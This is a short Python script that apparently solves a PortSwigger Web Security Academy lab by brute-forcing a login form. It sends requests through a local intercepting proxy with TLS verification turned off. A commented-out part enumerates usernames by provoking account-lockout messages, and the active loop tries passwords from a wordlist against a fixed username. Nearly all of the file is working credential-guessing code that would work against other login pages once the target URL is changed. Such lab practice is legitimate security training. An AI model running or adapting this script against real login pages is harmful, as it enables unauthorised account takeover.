import requests
import urllib
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

URl = 'https://0ab100f303199c45c0fd68f1005d0085.web-security-academy.net/login'

username_file = open("username.txt", "r")
password_file = open("password.txt", "r")

def getusername_and_password(file, file1):
    # for username in file.readlines() :
    #     username = username.strip("\n")
    #     data1 = {'username' : username, 'password' : '123'}
    #     for i in range(5):
    #         r = requests.post(URl, data=data1, verify=False, proxies=proxies)
    #     if 'Invalid username or password.' in r.text:
    #         print("Currently at %s username..." %username)
    #     else:
    #         valid_username = username
    #         print("Found! %s is a valid username!" %username)
    #         break
    valid_username = 'ad'
    # i = 1
    for password in file1.readlines():
        password = password.strip("\n")
        data2 = {'username' : valid_username, 'password' : password}
        r = requests.post(URl, data=data2, verify=False, proxies=proxies)
        if 'You have made too many incorrect login attempts.' in r.text or 'Invalid username or password.' in r.text:
            print("Currently at %s password..." %password)
            # i += 1
        else:
            print("Found! %s is a valid password for %s!" % (password,valid_username))
            break
        # if i % 3 == 0:
        #     time.sleep(60)
        #     i += 1

getusername_and_password(username_file, password_file)